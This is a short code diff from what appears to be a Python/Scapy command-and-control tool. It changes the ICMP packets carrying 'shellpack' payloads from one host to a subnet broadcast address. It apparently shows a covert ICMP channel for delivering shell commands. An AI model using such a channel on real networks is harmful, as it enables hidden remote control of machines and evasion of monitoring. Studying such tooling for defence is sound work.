@@ -239,7 +239,7 @@ class Controller(Host):
 
         for shellpack in shellpacks:
             print(shellpack)
-            data = (IP(src=self.ip, dst="192.168.157.10")/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
+            data = (IP(src=self.ip, dst="192.168.157.255")/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
             sr(data, timeout=0, verbose=0)
         
 
